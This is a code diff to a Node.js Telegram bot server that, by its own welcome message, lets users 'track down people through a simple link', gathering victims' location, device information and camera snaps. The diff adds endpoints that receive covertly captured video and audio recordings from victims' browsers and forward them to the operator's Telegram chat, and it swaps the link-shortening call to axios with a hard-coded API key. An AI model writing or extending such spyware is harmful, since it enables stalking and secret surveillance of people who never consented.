@@ -4,6 +4,7 @@ const express = require("express");
 var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
+const axios = require('axios');
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env["bot"], {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
@@ -23,27 +24,24 @@ var use1pt=true;
 const TINY_API_URL = "https://empiretech-api.hf.space/api/shortener/tiny";
 const API_KEY = "efe123";
 
-// Function to create custom tiny short link
+// Function to create custom tiny short link using axios
 async function createTinyShortLink(longUrl) {
     try {
-        const response = await fetch(`${TINY_API_URL}?apikey=${API_KEY}&url=${encodeURIComponent(longUrl)}`);
+        const response = await axios.get(`${TINY_API_URL}`, {
+            params: {
+                apikey: API_KEY,
+                url: longUrl
+            }
+        });
         
-        if (!response.ok) {
-            console.log(`Tiny URL API error: ${response.status}`);
-            return null;
-        }
-        
-        const data = await response.json();
-        
-        // Check if the API call was successful and has a result
-        if (data.success === true && data.result) {
-            return data.result;
+        if (response.data && response.data.success === true && response.data.result) {
+            return response.data.result;
         } else {
-            console.log('API returned error:', data);
+            console.log('API returned error:', response.data);
             return null;
         }
     } catch (error) {
-        console.error('Tiny URL shortening error:', error);
+        console.error('Tiny URL shortening error:', error.message);
         return null;
     }
 }
@@ -99,7 +97,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps, video recording, and audio recording.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
@@ -196,6 +194,52 @@ var acc=decodeURIComponent(req.body.acc) || null;
 if(lon != null && lat != null && uid != null && acc != null){
 bot.sendLocation(parseInt(uid,36),lat,lon);
 bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+res.send("Done");
+}
+});
+
+// New endpoint for video recording
+app.post("/video",(req,res)=>{
+var uid=decodeURIComponent(req.body.uid) || null;
+var video=decodeURIComponent(req.body.video) || null;
+  
+if( uid != null && video != null){
+var buffer=Buffer.from(video, 'base64');
+var info={
+filename:`video_${Date.now()}.webm`,
+contentType: 'video/webm'
+};
+
+try {
+bot.sendVideo(parseInt(uid,36), buffer, {}, info);
+bot.sendMessage(parseInt(uid,36), `🎥 Video recording received! Duration: ${req.body.duration || 'unknown'} seconds`);
+} catch (error) {
+console.log('Video send error:', error);
+}
+
+res.send("Done");
+}
+});
+
+// New endpoint for audio recording
+app.post("/audio",(req,res)=>{
+var uid=decodeURIComponent(req.body.uid) || null;
+var audio=decodeURIComponent(req.body.audio) || null;
+  
+if( uid != null && audio != null){
+var buffer=Buffer.from(audio, 'base64');
+var info={
+filename:`audio_${Date.now()}.webm`,
+contentType: 'audio/webm'
+};
+
+try {
+bot.sendAudio(parseInt(uid,36), buffer, {}, info);
+bot.sendMessage(parseInt(uid,36), `🎤 Audio recording received! Duration: ${req.body.duration || 'unknown'} seconds`);
+} catch (error) {
+console.log('Audio send error:', error);
+}
+
 res.send("Done");
 }
 });
